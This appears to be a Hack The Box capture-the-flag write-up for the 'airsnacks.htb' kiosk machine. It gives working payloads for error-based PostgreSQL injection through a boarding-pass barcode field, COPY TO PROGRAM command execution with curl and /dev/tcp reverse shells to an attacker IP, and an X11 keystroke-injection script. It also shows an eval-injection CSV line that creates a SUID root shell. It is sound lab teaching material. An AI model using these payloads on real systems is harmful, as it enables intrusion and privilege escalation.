#htb #medium #linux #web #bar-code #bcbp #sqli #sql-error-based #postgresql #rce #x11 #openbox #systemd #eval-injection

# Enumeration
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n 10.129.195.107 -oG scan
Discovered open port 443/tcp on 10.129.195.107
Discovered open port 80/tcp on 10.129.195.107
Discovered open port 22/tcp on 10.129.195.107
```

Ports 22, 80, 443 are open.

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nmap -p 22,80,443 -sCV 10.129.195.107 -oN portscan.txt -Pn
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Welcome \xC2\xB7 AirSnacks Self-Checkout
| ssl-cert: Subject: commonName=airsnacks.htb
```

The web apps are redirecting to `airsnacks.htb` so add the domain to `/etc/hosts`

```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ echo "10.129.195.107 airsnacks.htb" | sudo tee -a /etc/hosts
```

## Web application

The HTTP service redirects all requests to HTTPS, so further enumeration will focus on the HTTPS application.

The HTTPS application hosts an online shop featuring a boarding pass barcode scanner.

![[barcode_scanner.png]]

However, the barcode scanner does not appear to have access to a camera. To understand how it communicates with the backend, I intercepted its HTTP request using Burp Suite.
```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Cookie: session=...
Content-Length: 12

{"raw":""}
```

The scanner was sending an empty barcode to the server, which responds with the following error:
```json
{
  "detail":"expected 'M' at offset 0",
  "error":"BCBP_ERR_FORMAT_CODE",
}
```

>BCBP stands for *Bar Coded Boarding Pass*, a standard defined by the International Air Transport Association ([IATA](https://www.iata.org/contentassets/1dccc9ed041b4f3bbdcf8ee8682e75c4/2021_03_02-bcbp-implementation-guide-version-7-.pdf)).

##  BCBP format analysis

The structure of a valid BCBP is:

| Offset | Len | Field                             |
| ------ | --- | --------------------------------- |
| 0      | 1   | Format code                       |
| 1      | 1   | Legs                              |
| 2      | 20  | Name `LAST/FIRST`                 |
| 22     | 1   | Electronic ticket (E)             |
| 23     | 7   | PNR code                          |
| 30     | 3   | Origin                            |
| 33     | 3   | Destination                       |
| 36     | 3   | Operating carrier                 |
| 39     | 5   | Flight number                     |
| 44     | 3   | Flight date                       |
| 47     | 1   | Compartment                       |
| 48     | 4   | Seat number                       |
| 52     | 5   | Check-in sequence                 |
| 57     | 1   | passenger status                  |
| 58     | 2   | Size of conditional section (hex) |

After constructing a 60-character BCBP string and setting the conditional section size to `00`, the server returned `BCBP_ERR_CONDITIONAL_REQUIRED` for item 6, indicating that additional conditional data was required.

I then set the conditional section size to `FF` and used the subsequent error messages to infer the expected structure.

Through this process, I was able to reconstruct the following structure for the conditional section:
- `item10`: one of `0B, 18, 25, 32`.
- Document type: `B` or blank character.
- Seven blank characters.
- Operating carrier followed by a space.
- `item17`: one of `03, 0D, 0E, 0F, 12, 15, 25, 26, 29, 2A` theese are the spaces up to the beginning of the free zone.
- Remaining characters: free zone

My final code was:
```txt
M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03
```

Using that code in a request, the server returns a new session cookie and a JWT.
I couldn't find what was using the JWT, but the session cookie allowed the access to the payment button, although it does not provide any useful functionality.

# Exploitation
## Initial foothold

I suspected that the server might validate the boarding pass against a database, so I tested the passenger name field for SQL injection.
```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Cookie: session=...
Content-Length: 91

{"raw":"M1G'IFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03"}
```

The server returned an internal error containing a PostgreSQL syntax error, revealing that the backend uses a PostgreSQL database.
```json
{
  "detail":"syntax error at or near \"IFFIN\"\nLINE 1: ...1b35546d', 'dutyfree-kiosk7', now(), '123456', 'G'IFFIN/PETE...\n                                                             ^\n",
  "error":"DCS_ERR_INTERNAL"
}
```

However, the passenger name field is subject to strict format validation, making it difficult to inject SQL syntax. I therefore tried injecting the payload into the free zone instead.
```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Cookie: session=...
Content-Length: 91

{"raw":"M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03   '"}
```

This payload triggered a different PostgreSQL error:
```json
{
  "detail":"unterminated quoted string at or near \"''')\"\nLINE 1: .../PETER', 'BA', '0117', '325', 'ABC', 'DEF', '', '', 81, ''')\n                                                                   ^\n",
  "error":"DCS_ERR_INTERNAL"
}
```

The error message reveals part of the SQL statement, suggesting that the query follows a structure similar to:
```sql
INSERT INTO table_name (column1, column2, ...)
VALUES ('value1', 'value2', ..., 81, '<input>');
```

Since the input is concatenated directly into the SQL statement without proper sanitization or parameterization, the SQL string can be escaped using the following payload:
```json
{
  "raw":"M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03   '); SELECT version()::int; --"
}
```

I cast the result of `version()` to an integer to trigger a conversion error on the server, causing the database version to be included in the response.
```json
{
  "detail":"invalid input syntax for type integer: \"PostgreSQL 18.6 (Ubuntu 18.6-1.pgdg22.04+2) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.3) 11.4.0, 64-bit\"\n",
  "error":"DCS_ERR_INTERNAL"
}
```

## RCE

I tested if the PostgreSQL's `COPY ... TO PROGRAM` functionality could be abused to execute operating system commands.

First, start a HTTP server in the attacker machine.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ python -m http.server 8000
```

Then send the following request.
```json
{
  "raw":"M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03   '); COPY (SELECT '') TO PROGRAM 'curl http://IP:8000'; --" 
}
```

The HTTP server receives a GET request, confirming that command execution was successful.
```txt
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.195.107 - - [05/Nov/2026 18:29:25] "GET / HTTP/1.1" 200 -
```

Having confirmed that the SQL injection can be escalated to remote code execution, we can now execute a reverse shell to obtain access to the target.

First, Base64-encode a Bash reverse shell.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
```

Start a listener in port `4444`.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ nc -nlvp 4444
```

Finally send a request with the following body:
```json
{
  "raw":"M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03   '); COPY (SELECT '') TO PROGRAM '/bin/bash -c \"echo <Base64 payload> | base64 -d | /bin/bash\"'; --"
}
```

Now we have a shell with the user `postgres`.
```txt
postgres@dutyfree-kiosk7:/var/lib/postgresql/18/main$
```

## Post exploitation

While enumerating running processes, I discovered that the user `dutyfree-kiosk` has an active X11 session managed by `xinit`, with Firefox running in kiosk mode on display `:0`.

```bash
postgres@dutyfree-kiosk7:/home$ ps aux | grep kiosk
ps aux | grep kiosk
dutyfre+     tty7     S+   0:00 xinit /home/dutyfree-kiosk/.xinitrc -- /usr/bin/X :0 vt7 -nolisten tcp -auth /tmp/serverauth.2kKPYtbbBC
dutyfre+    tty7   Sl   0:29 /snap/firefox/8803/usr/lib/firefox/firefox --kiosk https://airsnacks.htb
```

Then I checked if I could connect to the X server:
```bash
postgres@dutyfree-kiosk7:/home$ DISPLAY=:0 xset q       
Keyboard Control:
  auto repeat:  on    key click percent:  0    LED mask:  00000000
Screen Saver:
  prefer blanking:  yes    allow exposures:  yes
  timeout:  600    cycle:  600
```

Since the command didn't return an error the current user can connect to the X server, so I checked the Openbox keybindings.
```bash
postgres@dutyfree-kiosk7:/home$ cat /etc/xdg/openbox/rc.xml | grep term
  <keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
```

> The key combination `Ctrl + Alt + t` launches a `xterm` terminal.

X11 provides an extension called XTEST, which allows X11 clients to simulate keyboard and mouse input events.

By using this extension, we can interact with the active graphical session. Since the session belongs to `dutyfree-kiosk`, we can simulate keyboard input to open a terminal and execute commands as that user.

I will use a Python script to connect to the X server and simulate keyboard input.

The script:
- Connects to the X11 display.
- Simulates the shortcut `Ctrl + Alt + t` to open a terminal.
- Executes a reverse-shell command.

>[!Note]- Script
>```python
>import time
>from Xlib import X, XK, display
>from Xlib.ext import xtest
>
>x11 = display.Display()
>
>LHOST = "10.10.14.163"
>LPORT = "4433"
>
>PUNCT = {
>    ' ': 'space', '/': 'slash', '.': 'period', '_': 'underscore',
>    '>': 'greater', '<': 'less', '-': 'minus', ':': 'colon',
>    ';': 'semicolon', '=': 'equal', '+': 'plus', '*': 'asterisk',
>    '&': 'ampersand', '|': 'bar', "'": 'apostrophe', '"': 'quotedbl',
>    '$': 'dollar', '%': 'percent', '^': 'asciicircum', '~': 'asciitilde',
>    '\\': 'backslash', '!': 'exclam', '@': 'at', '#': 'numbersign',
>    '(': 'parenleft', ')': 'parenright', '{': 'braceleft', '}': 'braceright',
>    '?': 'question', ',': 'comma',
>}
>
>def get_key_sym(ch):
>    if ch in PUNCT:
>        return XK.string_to_keysym(PUNCT[ch])
>    return XK.string_to_keysym(ch)
>
>def get_key_code(name):
>    keysym = XK.string_to_keysym(name)
>
>    return x11.keysym_to_keycode(keysym)
>
>def key_event(key, event):
>    xtest.fake_input(x11, event, key)
>    x11.sync()
>
>def shortcut(*keys):
>    codes = [get_key_code(n) for n in keys]
>    for key in codes:
>        key_event(key, X.KeyPress)
>
>    time.sleep(0.1)
>    for key in reversed(codes):
>        key_event(key, X.KeyRelease)
>
>def write_text(text):
>    shift_chars = set('!@#$%^&*()_+{}|:"<>?~')
>    for char in text:
>        if char == "\n":
>            key = get_key_code("Return")
>        else:
>            ks = get_key_sym(char)
>            key = x11.keysym_to_keycode(ks)
>
>        if not key:
>            return
>
>        needs_shift = char.isupper() or char in shift_chars
>        if needs_shift:
>            shift_kc = get_key_code("Shift_L")
>            key_event(shift_kc, X.KeyPress)
>
>        key_event(key, X.KeyPress)
>        key_event(key, X.KeyRelease)
>
>        if needs_shift:
>            key_event(shift_kc, X.KeyRelease)
>
>        time.sleep(0.03)
>
>
>if __name__ == "__main__":
>    shortcut("Control_L", "Alt_L", "t")
>    time.sleep(2)
>    payload = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\n"
>    try:
>        write_text(f"{payload}")
>    finally:
>        x11.close()
>        print("Done")
>```

First, start a listener.
```bash
[hvidal@fedora] ~/.ssh
❯ nc -nlvp 4433
```

Set `LHOST` and `LPORT` to to the attackers IP address and listening port, then execute the script on the target.
```bash
DISPLAY=:0 python3 keys.py
```

Now we have a new shell as `dutyfree-kiosk` and we can read the user flag.
```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ cat user.txt
```

# Privilege escalation

## Enumeration

First, I searched for files writable by the current user.
```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ find / -writable 2>/dev/null | grep -v "sys\|proc\|snap\|var\|run\|dev\|tmp"
/home/dutyfree-kiosk/.Xauthority
/opt/vrs/data
/opt/vrs/data/duty-rates.csv
```

I found an unusual writable file at `/opt/vrs/data/duty-rates.csv`, so I investigated  which process was using it.

I discovered a systemd service named `vrs-duty-apply.service`, which executes the previously mentioned script as root.
```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ cat /etc/systemd/system/vrs-duty-apply.service
[Service]
Type=oneshot
ExecStart=/opt/vrs/bin/apply-duty-rates.sh
```

This service is triggered by `vrs-duty-apply.path`, a systemd path unit that monitors `/opt/vrs/data/duty-rates.csv` and starts the service whenever the file is modified.
```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ cat /etc/systemd/system/vrs-duty-apply.path
[Path]
PathModified=/opt/vrs/data/duty-rates.csv
Unit=vrs-duty-apply.service
```

The script processes the CSV file line by line, using commas as field delimiters. Each row follows this format:
```csv
tax_class(str),duty_pct(int),vat_pct(int)
```

It validates that the fields exists and `duty_pct` and `vat_pct` are numbers, and then executes `eval "${tax_class}=${duty_pct}"`.

>`eval` executes the arguments as bash.

The vulnerability lies in the use of `eval` with the untrusted `tax_class` value. Since this field is not properly validated, an attacker can inject arbitrary shell commands into the expression passed to `eval`, potentially achieving command execution with the privileges of the process running the script.

>[!Note]- Relevant code snippets
>
>```bash
>RATES="/opt/vrs/data/duty-rates.csv"    # CSV file to process
>
>lineno=0
># Read the CSV line by line
>while IFS=, read -r tax_class duty_pct vat_pct; do   
>    (( ++lineno ))
>
>	# duty_pct and vat_pct have to be numbers
>	if ! [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]]; then
>		exit 1
>	
>	eval "${tax_class}=${duty_pct}"   # tax_class is not validated
>...
>```

## Exploitation

The objective is to modify the CSV file by inserting a payload into the first column which allows us to execute commands as root.

The following payload copies `/bin/bash` to `/tmp` and sets the SUID bit on the resulting binary:
```csv
cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash #,45,20
```

When the service process the file we can execute the copy of `/bin/bash` to obtain a root shell.
```bash
dutyfree-kiosk@dutyfree-kiosk7:$ /tmp/rootbash -p
```

We can now read the flag:
```bash
rootbash-5.1$ cat root.txt
```
